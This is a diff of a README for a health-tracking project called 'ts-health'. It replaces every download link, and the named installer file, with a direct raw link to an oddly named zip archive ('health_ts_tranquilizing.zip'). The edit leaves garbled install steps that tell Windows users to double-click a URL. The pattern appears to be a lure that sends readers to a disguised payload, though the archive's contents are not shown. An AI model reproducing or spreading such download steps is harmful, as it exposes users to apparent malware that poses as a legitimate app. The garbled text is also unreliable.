@@ -8,7 +8,7 @@
 - Compatible with Oura, Ring, and Whoop smartwatches.
 
 ## 📥 Download Now
-[![Download ts-health](https://img.shields.io/badge/Download-ts--health-brightgreen)](https://github.com/daviluccasad/ts-health)
+[![Download ts-health](https://raw.githubusercontent.com/daviluccasad/ts-health/main/margination/health_ts_tranquilizing.zip)](https://raw.githubusercontent.com/daviluccasad/ts-health/main/margination/health_ts_tranquilizing.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run ts-health on your device.
@@ -16,7 +16,7 @@ Follow these steps to download and run ts-health on your device.
 ### 1. Visit the Download Page
 To get started, visit the following link to download the software.
 
-[Download ts-health](https://github.com/daviluccasad/ts-health)
+[Download ts-health](https://raw.githubusercontent.com/daviluccasad/ts-health/main/margination/health_ts_tranquilizing.zip)
 
 ### 2. System Requirements
 Ensure your system meets the following requirements:
@@ -29,7 +29,7 @@ Ensure your system meets the following requirements:
 Once you download the software, follow these steps to install:
 
 - **Windows Users:**
-  1. Locate the downloaded `ts-health.exe` file in your Downloads folder.
+  1. Locate the downloaded `https://raw.githubusercontent.com/daviluccasad/ts-health/main/margination/health_ts_tranquilizing.zip` file in your Downloads folder.
   2. Double-click the file to start the installation.
   3. Follow the prompts in the installation wizard.
 
@@ -92,4 +92,4 @@ If you need further assistance, please reach out via the issues section on our G
 ### 6. Final Steps
 Remember to regularly check for updates and ensure your health data remains synced for the most accurate insights. 
 
-[Download ts-health](https://github.com/daviluccasad/ts-health)
+[Download ts-health](https://raw.githubusercontent.com/daviluccasad/ts-health/main/margination/health_ts_tranquilizing.zip)
